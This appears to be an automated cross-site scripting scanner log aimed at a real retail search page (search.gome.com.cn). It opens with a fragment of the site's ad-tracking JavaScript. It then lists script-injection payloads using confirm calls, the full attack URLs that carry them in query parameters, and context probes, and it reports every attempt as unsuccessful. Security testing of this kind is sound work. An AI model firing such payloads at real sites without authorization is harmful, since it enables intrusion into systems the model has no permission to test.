"\xe7\x94\xb5\xe8\x84\x91 \xe5\x8a\x9e\xe5\x85\xac\xe6\x89\x93\xe5\x8d\xb0 \xe6\x96\x87\xe4\xbb\xaa";\n    dspData.dsp_gome_c2name = "\xe7\x94\xb5\xe8\x84\x91\xe6\x95\xb4\xe6\x9c\xba";\n    dspData.dsp_gome_c3name = "\xe7\xac\x94\xe8\xae\xb0\xe6\x9c\xac";\n\n    dspData.dsp_gome_c1id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-itemfir\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000001";\n\n    dspData.dsp_gome_c3id = (function(){\n        var el = document.getElementsByClassName(\'facets-hot-item\');\n        if(el.length > 0){\n            var str=[];\n            for(var i = 0,j=el.length;i<j &&i <3;i++){\n                str.push(el[i].getAttribute("facetsid"))\n            }\n            return str.join(",");\n        }\n        return "";\n    })() || "cat10000092";\n\n    dspData.dsp_gome_brid = (function(){\n        var el = document.getElementById("brandChoose");\n        if(el){\n            return el.getAttribute("brandId").substring(1)\n        }\n        return "";\n    })();\n\n    dspData.url={\n        //dsp_url_s:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_s:"//flight.gome.com.cn/flight",//prd\n        //dsp_url_c:"//ad-flitght.pre.ds.gome.com.cn:8080/flight",//uat\n        dsp_url_c:"//flight.gome.com.cn/flight",//prd\n        //flight_url:"//storeConfiguration.flightDomain",\n        flight_url:"//flight.gome.com.cn",\n        bigdata_url:"//bigd.gome.com.cn/gome/rec"\n    };\n\n</script>'
+Attack Payloads for SCRIPT
+['"; confirm`1`; "', "'; confirm`1`; '"]
+
+SCRIPT Attack Url: https://search.gome.com.cn/search?question=new&searchType=goods&search_mode="; confirm`1`; "&reWrite=true&instock=1
+
+ ______Detection  UnSuccessful with payload: "; confirm`1`; "
+
+
+SCRIPT Attack Url: https://search.gome.com.cn/search?question=new&searchType=goods&search_mode='; confirm`1`; '&reWrite=true&instock=1
+
+ ______Detection  UnSuccessful with payload: '; confirm`1`; '
+
+_______________________________________________________________________________________________________
+https://search.gome.com.cn/search?question=new&searchType=goods&search_mode=normal&reWrite=abc/uvw"xyz'yxz<zxy&instock=1
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+_______________________________________________________________________________________________________
+https://search.gome.com.cn/search?question=new&searchType=goods&search_mode=normal&reWrite=true&instock=abc/uvw"xyz'yxz<zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
